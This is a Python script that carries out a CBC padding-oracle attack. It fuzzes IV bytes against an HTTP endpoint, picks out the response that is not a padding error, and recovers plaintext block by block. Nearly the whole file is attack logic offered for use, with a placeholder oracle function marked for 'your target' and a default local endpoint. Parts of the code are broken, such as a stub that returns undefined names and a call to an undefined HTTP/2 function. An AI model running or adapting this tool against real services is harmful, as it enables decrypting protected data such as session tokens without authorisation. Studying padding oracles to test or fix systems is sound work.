import base64
import binascii
import requests
import time
import hashlib
import sys

############################# FUNCTIONS ##############################

# helper to chop the encrypted_bytes into a list of blocks based on the provided block_size
def slice_up_encrypted_bytes(internal_encrypted_bytes, internal_block_size):
    # calculate the length in characters of a block
    internal_block_length = internal_block_size * 2
    # ensure that encrypted bytes is a multiple of block size:
    if len(internal_encrypted_bytes) % internal_block_length != 0:
        print("[!] Fatal error: Encrypted bytes must be a multiple of block size.")
        sys.exit()
    else:
        internal_block_list = []
        i2 = 0
        no_blocks_in_encrypted_bytes = len(internal_encrypted_bytes) / internal_block_length
        print("[i] Block size:       " + str(internal_block_size))
        print("[i] Number of blocks: " + str(int(no_blocks_in_encrypted_bytes)))
        while i2 < no_blocks_in_encrypted_bytes:
            internal_block_list.append(internal_encrypted_bytes[(i2 * internal_block_length):(i2 * internal_block_length) + internal_block_length])
            i2 += 1
        return internal_block_list, internal_block_length

# This does the initial fuzz of just one byte, to measure for differences. A second function
# (full_byte_fuzzer) will do the main fuzz later on. We need some info early on to make decisions about
# how to complete the exploit.
def byte_fuzzer(internal_block_length, internal_ciphertext, internal_delay):
    internal_results_list = []
    counter = 0
    bytes_to_truncate = 2
    length_of_truncated_iv = internal_block_length - bytes_to_truncate
    truncated_iv = "0" * length_of_truncated_iv
    # print('[i] Fuzzing oracle endpoint. Please wait...')
    while counter < 256:
        hex_bytes = "{:02x}".format(counter)
        updated_iv = truncated_iv + hex_bytes
        internal_full_encrypted_bytes = updated_iv + internal_ciphertext
        time.sleep(internal_delay)  # delay before the first request
        internal_results_list.append(hex_bytes + ':' + str(check_for_padding_error(internal_full_encrypted_bytes)))
        counter += 1
        if counter % 16 == 0:
            print("[i] " + str(counter) + "/256", end='\r')
    return internal_results_list

# Takes a list of results from the initial byte fuzz and adds a hash of the results to each item in the list.
# Finally, it returns a new list with the added hashes.
# We are hunting for one response that is different from all the rest, so for each response,  we hash the things
# we care about, like status code, response length, whether the word 'padding' or 'error' was in the response,
# then we can then count the number of unique hashes - if there is only one instance of a given hash, that is
# a strong indicator we have found the byte that matches the padding value '01'.
def analyse(internal_results_list):
    internal_analysis_list = []
    for item in internal_results_list:
        # Note that we need to *not* include the duration in this hash, since we will use that later if needed
        # but not in the initial select - we want to use all the other things like status code, etc, if possible.
        byte_sent = item.split(':')[0]
        buffer = item.split(':')[1].split('(')[1].split(')')[0].split(',')[:-1]
        result = ",".join(buffer)
        # the above should take this:
        # 0a: ('Y', 'N', 500, 30, 'N/A', 0.00393774700000904)
        # and return this:
        # 'Y', 'N', 500, 30, 'N/A'
        # print("byte_sent" + byte_sent)
        # print("result" + result)
        hashed_result = hashlib.md5(result.encode())
        internal_analysis_list.append(byte_sent + ':' + result + ':' + str(hashed_result.hexdigest()))
    return internal_analysis_list

# takes the results of the byte fuzz with added hashes and returns a smaller list
# where items are limited to those with unique hashes also counts the number of each unique hash
def unique_table(internal_analysis_list):
    list_of_unique_hashes = []
    list_of_unique_hashes_with_count = []

    # create a list of unique hashes
    for item in internal_analysis_list:
        result_hash = item.split(':')[2]
        list_of_unique_hashes.append(result_hash)

    # reduce the list of hashes to those that are unique
    list_of_unique_hashes = list(dict.fromkeys(list_of_unique_hashes))

    # we add a 'column' (: seperator) which will store the frequency later on.
    # for now, we add the 'column' and a value of zero
    for item in list_of_unique_hashes:
        list_of_unique_hashes_with_count.append(item + ':0')

    # we now create one final list of unique entries only, where we pull in all
    # the data, and add a frequency (count) value for each unique entry
    for item in internal_analysis_list:
        a = item.split(':')[0]
        b = item.split(':')[1]
        result_hash = item.split(':')[2]
        index = 0  # we need this to know which list entry to modify later
        for row in list_of_unique_hashes_with_count:
            hash_to_check = row.split(':')[0]
            hash_count = row.split(':')[1]
            if result_hash == hash_to_check:
                list_of_unique_hashes_with_count[index] = hash_to_check + ':' + str(
                    int(hash_count) + 1) + ':' + a + ':' + b
            index = index + 1
    return list_of_unique_hashes_with_count

def user_selection(internal_unique_list):
    ##UNCOMMENT TO TEST FOR TIME BASED##
    #internal_unique_list = []
    #internal_unique_list.append("eb772b7daf6c3b32d26aad120641e5: 255:ff: 'Y', 'N', 500, 30, 'N/A'")
    ##REMOVE ME ##
    count = 1
    print('[i] Initial fuzz complete. ')
    print('[i] Please select an ID that matches a valid decrypt:\n')
    print('-------------------------------------------------------------------')
    print('ID#     Freq     Status   Length   Error   Custom  Location')
    print('-------------------------------------------------------------------')
    for item in internal_unique_list:
        # print(item)
        line = item.split(':')
        # print(line)
        chunk = line[3].split(',')
        # print(chunk)
        error_found = chunk[0].split("'")[1]
        padding_found = chunk[1].split("'")[1]
        status = chunk[2]
        length = chunk[3]
        location = chunk[4].split("'")[1]
        recommend = "   "
        if line[1] == "1":
            recommend = " **"
        # This is just to keep the columns data in the right place because the length value can vary quite a bit
        length_padding = 10 - len(length)
        padded_length = length + (length_padding * ' ')
        print(str(count) + recommend + '\t' + line[
            1] + '\t\t' + status + '     ' + padded_length + error_found + '       ' + padding_found + '       ' + location)
        count += 1
    print('-------------------------------------------------------------------')
    if len(internal_unique_list) == 1:
        return None
    internal_selection = input("\n Enter an ID: ")
    if int(internal_selection) < (count + 1):
        if int(internal_selection) > 0:
            print("[i] Continuing test with selection: " + internal_selection)
            return internal_unique_list[int(internal_selection) - 1]
        else:
            user_selection(internal_unique_list)
    else:
        user_selection(internal_unique_list)

def full_byte_fuzzer(internal_block_length, internal_ciphertext, internal_selection, internal_position_to_fuzz,
                     internal_postfix_byte, internal_upper_bound, internal_lower_bound, internal_delay_if_time_based):
    bytes_to_truncate = (internal_block_length - (internal_position_to_fuzz * 2) + 2)
    length_of_truncated_iv = internal_block_length - bytes_to_truncate
    truncated_iv = "0" * length_of_truncated_iv
    # print("truncated_iv ", truncated_iv)
    # print("internal_postfix_byte      ", internal_postfix_byte)
    if not time_based_mode:
        # this is the selection criteria from the user - e.g. 'Y', 'Y', 200, 4748
        target = internal_selection.split(':')[3]
    # print("target      ", str(target))
    counter = 0
    while counter < 256:
        hex_bytes = "{:02x}".format(counter)
        updated_iv = truncated_iv + hex_bytes + internal_postfix_byte
        # print("updated_iv  ", updated_iv)
        full_encrypted_bytes = updated_iv + internal_ciphertext
        if len(full_encrypted_bytes) % 2 != 0:
            print("[!] Fatal error: bytes string must be even length!")
            print("internal_postfix_byte: " + internal_postfix_byte)
            sys.exit()
        if time_based_mode:
            compare_run_counter = 0
            response_time_running_total = 0

            while compare_run_counter < number_of_measurement_runs:
                time.sleep(internal_delay_if_time_based)
                check_result = str(check_for_padding_error(full_encrypted_bytes))
                check_time = float(check_result.split(' ')[5].strip(')'))
                response_time_running_total = response_time_running_total + check_time
                compare_run_counter += 1

            response_time = response_time_running_total / number_of_measurement_runs
            if internal_lower_bound < response_time:
                if internal_upper_bound > response_time:
                    return hex_bytes

        else:
            # Normal mode
            check_result = str(check_for_padding_error(full_encrypted_bytes))
            # if the response criteria match the criteria selected by the user,
            # we found the one request that did not trigger a padding oracle error
            buffer = check_result.split('(')[1].split(')')[0].split(',')[:-1]
            output = ",".join(buffer)
            #print("target      ", str(target))
            #print("output      ", str(output))
            # a fuzzy match is used on response length
            # as a bit of variation here is not unusual
            o_error = output.split(',')[0]
            o_padding = output.split(',')[1]
            o_status = output.split(',')[2]
            o_location = output.split(',')[4]
            o_length = output.split(',')[3]
            t_error = target.split(',')[0]
            t_padding = target.split(',')[1]
            t_status = target.split(',')[2]
            t_location = target.split(',')[4]
            t_length = target.split(',')[3]
            match = False
            if t_error == o_error:
                if t_padding == o_padding:
                    if int(t_status) == int(o_status):
                        if t_location == o_location:
                            if int(t_length) >= (int(o_length) - response_length_variation):
                                if int(t_length) <= (int(o_length) + response_length_variation):
                                    match = True
            if match:
                #return hex_bytes
                if position_to_fuzz == 1:  # this can't be done on the last byte
                    return hex_bytes
                else:
                    #print("[i] Potential match found! Running secondary test.")
                    # although a match has been found (say for 01 being the final
                    # byte of the plaintext block) there is a potential problem:
                    # what if we instead matched on the last byte of 0202? or 030303?
                    # we can test for this by seeing if the previous byte matches this one
                    # and if it does, we have found a match.
                    # https://www.nccgroup.com/research/cryptopals-exploiting-cbc-padding-oracles/
                    if hex_bytes != "00":
                        special_iv = truncated_iv[:-2] + "00" + hex_bytes + internal_postfix_byte
                    else:
                        special_iv = truncated_iv[:-2] + "01" + hex_bytes + internal_postfix_byte
                    print("updated_iv  ", updated_iv)
                    print("special_iv  ", special_iv)
                    new_encrypted_bytes = special_iv + internal_ciphertext
                    result = str(check_for_padding_error(new_encrypted_bytes))
                    buffer = result.split('(')[1].split(')')[0].split(',')[:-1]
                    output = ",".join(buffer)
                    #print(output)
                    o_error = output.split(',')[0]
                    o_padding = output.split(',')[1]
                    o_status = output.split(',')[2]
                    o_location = output.split(',')[4]
                    o_length = output.split(',')[3]
                    match = False
                    if t_error == o_error:
                        if t_padding == o_padding:
                            if t_status == o_status:
                                if t_location == o_location:
                                    if int(t_length) >= int(o_length) - response_length_variation:
                                        if int(t_length) <= int(o_length) + response_length_variation:
                                            match = True
                    if match:
                        #print("[i] Passed secondary test! Match confirmed!")
                        return hex_bytes
                    else:
                        print("[i] Failed secondary test! Match not confirmed!")
        counter += 1
        if counter % 16 == 0:
            print("[i] " + str(counter) + "/256", end='\r')
    # If we get here, we have failed to find a match for the byte
    return None

# receive two variables that are 'hex bytes as strings': e.g. 'f8' and '09'
# XOR them and return a 'hex bytes as string' such as 'd4'
def change_to_be_hex(s):
    return int(s, base=16)

def xor_bytes(str1, str2):
    a = change_to_be_hex(str1)
    b = change_to_be_hex(str2)

    xored_bytes_as_hex = hex(a ^ b)
    # i'm going to hell for this bullshit:
    xored_bytes_as_string = xored_bytes_as_hex[2:]
    # print("str1:                  " + str1)
    # print("str2:                  " + str2)
    # print("xored_bytes_as_string: " + xored_bytes_as_string)
    # bug: if the two input strings were, for example: 0303 and 036d, the output would be 6e instead of 006e
    # also 0f was being returned as f.
    # so, as the strings should always be the same length (both input and output) then I can grab that
    # on input and preserve it on output by appending a suitable number of zeros.

    if len(xored_bytes_as_string) != len(str1):
        zeropad = (len(str1) - len(xored_bytes_as_string)) * '0'
        xored_bytes_as_string = zeropad + xored_bytes_as_string
    return xored_bytes_as_string

# walk two provided hex byte strings and attempt to decrypt each byte in turn
# if a given byte cant be decrypted, return '?' instead for that character.
def bytewise_decrypter(internal_intermediary_value, internal_ciphertext):
    if len(internal_intermediary_value) != len(internal_ciphertext):
        print("[!] Fatal error: bytes strings must be same length")
        print("internal_intermediary_value: " + internal_intermediary_value)
        print("internal_ciphertext:         " + internal_ciphertext)
        sys.exit()
    inter_count = 0
    ptext_buffer = ""
    while inter_count < (len(internal_ciphertext)) / 2:
        ciphertext_byte = internal_ciphertext[inter_count * 2:(inter_count * 2) + 2]
        intermediary_val_byte = internal_intermediary_value[inter_count * 2:(inter_count * 2) + 2]
        # print("ciphertext_byte:       " + ciphertext_byte)
        # print("intermediary_val_byte: " + intermediary_val_byte)
        ptext_bytes = xor_bytes(ciphertext_byte, intermediary_val_byte)
        try:
            ptext_ascii = binascii.unhexlify(ptext_bytes).decode('ascii')
        except:
            ptext_ascii = "?"
        ptext_buffer = ptext_buffer + ptext_ascii
        inter_count += 1
    return ptext_buffer

### Oracle request handler  ###
### Overwrite this to interact with your target ###
def check_for_padding_error(full_encrypted_bytes):
    
    # Here's where you add the code that will send in full_encrypted_bytes to your target
    # one of your 256 results should cause thing_that_changes or one or many of the other values returned to change  
     
    # downstream functions expect a tuple with the data types used below
    # it will be easiest to stick to these data types:
    # ('Y', 'N', 500, 30, 'N/A', 0.00393774700000904)    
    
    # you can use all or just one of them 
    # detection logic only needs one to change    
    return thing_that_changes, "1", int_1, int_2, "1", "1"

########################### MAIN PROGRAM #############################
# Default values

requests_allow_redirects = "True"
method = "POST"
scheme = "http"
authority = "127.0.0.1"
port = "8080"
path = "/padding"
base64encoding_on_output = False
json_format = "True"
body = "a"
headers={'Cookie': '123561762351635'}
no_iv_mode = False
delay_if_time_based = 0.0
response_length_variation = 20
protocol = "HTTP1"
http2_mode = False
number_of_measurement_runs = 1
http2_group_size = 16

block_size = 16

### YOUR PAYLOAD GOES HERE: 
encrypted_bytes = "ffffe5e5ffe4e4ffffe6e632e5e6d2d2"


# chop the encrypted_bytes into blocks and put them in a list:
block_list, block_length = slice_up_encrypted_bytes(encrypted_bytes, block_size)

# STEP 1: perform an initial fuzz of the last byte of the last block
# This step is just to gather the selection criteria of a non-padding error response
# Grab the final block for now - later we will need to loop down through the blocks:
ciphertext = block_list[-1]

# fuzz the last byte of the IV and gather the details of the responses into results_list:
results_list = byte_fuzzer(block_length, ciphertext, 0)

# analyze the results_list:
analysis_list = analyse(results_list)

# distil the analysis_list into unique results:
unique_list = unique_table(analysis_list)

# assume we don't need to use time based
time_based_mode = False
upper_bound = ""
lower_bound = ""

# let the user select the signature of the non-padding error response from the unique results:
selection = user_selection(unique_list)

normal_mode = False
if selection:
    print("[i] Normal mode selected")
    normal_mode = True
else:
    print("[i] Could not detect a padding oracle using response status, length etc. ")
    sys.exit()

plaintext_buffer = ""
zeroing_iv_buffer = ""
# STEP 2: Now that we have the selection criteria, we can start looping forward from the first block
# if No IV mode is activated, we can start from block 0, otherwise, we start from block 1 as we want
# to skip the IV block if it's present
# this block_count integer counter will decide the position of the block_list we will take for fuzzing
if no_iv_mode:
    block_count = 0
else:
    block_count = 1
simple_counter = 1  # as the block_count can start from 0 or 1, I needed a simple counter to count the loops
while block_count < len(block_list):
    print("\n*** Starting Block " + str(simple_counter) + " of " + str(len(block_list)) + " ***")

    # print("*** Starting Block " + str(block_count) + " of " + str(len(block_list) - 1) + " ***")
    # obtain the current block from the ciphertext
    current_block = block_list[block_count]

    # initialize a negative counter at 1/2 of block_length
    # we will use this to work back from the last byte to
    # the first of the block
    position_to_fuzz = block_size

    # this counter will be the opposite of position_to_fuzz - it will start
    # at 1, and increment up to the block size value we need this to know
    # what the plaintext would be for each loop - for example:
    #     the plaintext for position 16 will be 01
    #     the plaintext for position 15 will be 02
    #     the plaintext for position 14 will be 03
    fuzz_loop_count = 1

    padding_array = ""
    postfix_byte_array = ""
    zeroing_iv_array = ""
    zeroing_iv_byte = ""
    postfix_byte = ""
    plain_text = ""

    while position_to_fuzz > 0:
        if normal_mode:
            byte_found = full_byte_fuzzer(2, current_block, selection, position_to_fuzz, postfix_byte,
                                          upper_bound, lower_bound, delay_if_time_based)
            if not byte_found:
                print("[!] Detection error: No match was found.")
                print("[i] Trying again.")
                byte_found = full_byte_fuzzer(block_length, current_block, selection, position_to_fuzz,
                                              postfix_byte, upper_bound, lower_bound, delay_if_time_based)

        else:
            if http2_mode:
                byte_found = http2_fuzz_manager(block_length, current_block, selection, position_to_fuzz, postfix_byte,
                                                upper_bound, lower_bound, delay_if_time_based)
                if not byte_found:
                    print("[!] Detection error: No match was found.")
                    print("[i] Trying again.")
                    byte_found = http2_fuzz_manager(block_length, current_block, selection, position_to_fuzz,
                                                    postfix_byte,
                                                    upper_bound, lower_bound, delay_if_time_based)
            else:
                byte_found = full_byte_fuzzer(2, current_block, selection, position_to_fuzz, postfix_byte,
                                              upper_bound, lower_bound, delay_if_time_based)
                if not byte_found:
                    print("[!] Detection error: No match was found.")
                    print("[i] Trying again.")
                    byte_found = full_byte_fuzzer(block_length, current_block, selection, position_to_fuzz,
                                                  postfix_byte, upper_bound, lower_bound, delay_if_time_based)

        # let the user know on success:
        if byte_found is not None:
            found_value = binascii.unhexlify(byte_found)
            print("[+] Success: (" + str(256 - (int.from_bytes(found_value, "little"))) + "/256)\t[Byte " + str(
                position_to_fuzz) + "]")
        else:
            print("[!] Fatal error: detection failed. Check settings.")
            sys.exit()
        # at this point, we have found a matching byte using the padding oracle.
        # we now need to set up the values to fuzz the byte at the next position.

        # get the current input value, expressed as a hex value:
        current_byte_input_value = f"{fuzz_loop_count:02x}"

        # print("byte_found:               ", byte_found)
        # print("current_byte_input_value: ", current_byte_input_value)
        # print("XORing " + byte_found + " with " + current_byte_input_value + ":")

        zeroing_iv_byte = xor_bytes(byte_found, current_byte_input_value)
        # print("zeroing_iv_byte:          ", zeroing_iv_byte)
        if len(zeroing_iv_byte) % 2 != 0:
            print("[!] Fatal error: bytes strings must be even length")
            print("zeroing_iv_byte: " + zeroing_iv_byte)
            sys.exit()

        # we build up an array of bytes that is the 'zeroing IV'
        zeroing_iv_array = zeroing_iv_byte + zeroing_iv_array
        if len(zeroing_iv_array) % 2 != 0:
            print("[!] Fatal error: bytes strings must be even length")
            print("zeroing_iv_array: " + zeroing_iv_array)
            sys.exit()

        # we need to construct a padding array. these look like:
        # 02
        # 0303
        # 040404
        # this is what we want to feed into the padding oracle
        # however, we must xor these values with the zeroing IV
        # before we feed them in - this is a known plaintext attack
        i = fuzz_loop_count
        v = f"{(i + 1):02x}"
        padding_array = v * i
        if len(padding_array) % 2 != 0:
            print("[!] Fatal error: bytes strings must be even length")
            print("padding_array: " + padding_array)
            sys.exit()

        # print("zeroing_iv_array:         ", zeroing_iv_array)
        # print("padding_array:            ", padding_array)

        # print("XORing " + padding_array + " with " + zeroing_iv_array + ":")
        postfix_byte = xor_bytes(padding_array, zeroing_iv_array)
        if len(postfix_byte) % 2 != 0:
            print("[!] Fatal error: bytes strings must be even length")
            print("postfix_byte: " + postfix_byte)
            sys.exit()

        # print("postfix_byte:             ", postfix_byte)

        fuzz_loop_count += 1
        position_to_fuzz -= 1
    ## !! NOTE - OUTER LOOP IS HERE !! ###
    ## THIS IS RETURNING TO BLOCK-LEVEL ##
    plain_text = xor_bytes(zeroing_iv_array, block_list[block_count - 1])
    print("\nBlock " + str(simple_counter) + " Results:")
    print("[+] Cipher Text (HEX):        ", current_block)
    print("[+] Intermediate Bytes (HEX): ", zeroing_iv_array)
    print("[+] Decrypted value (ASCII):   " + bytewise_decrypter(zeroing_iv_array, block_list[block_count - 1]))
    print("[+] Plain Text:                " + plain_text)
    block_count += 1
    simple_counter += 1
    plaintext_buffer = plaintext_buffer + plain_text
    zeroing_iv_buffer = zeroing_iv_buffer + zeroing_iv_array
print("-------------------------------------------------------")
print("*** Finished ***")
print("")
print("[+] Zeroing IV (HEX):          " + zeroing_iv_buffer)
print("")
print("[+] Decrypted value (HEX):     " + plaintext_buffer)
print("")

# we need to get all the blocks except the last one, then xor this with the zeroing_iv_buffer
# this should give us the plain text
full_block_buffer = encrypted_bytes[:-block_length]

print("[+] Decrypted value (ASCII):   " + bytewise_decrypter(zeroing_iv_buffer, full_block_buffer))
print("")
# plaintext_buffer_bytes = plaintext_buffer.decode("ascii")
base64_bytes = base64.b64encode(binascii.unhexlify(plaintext_buffer))
base64_string = base64_bytes.decode("ascii")
print("[+] Decrypted value (Base64):  " + base64_string)
print("")
print("-------------------------------------------------------")
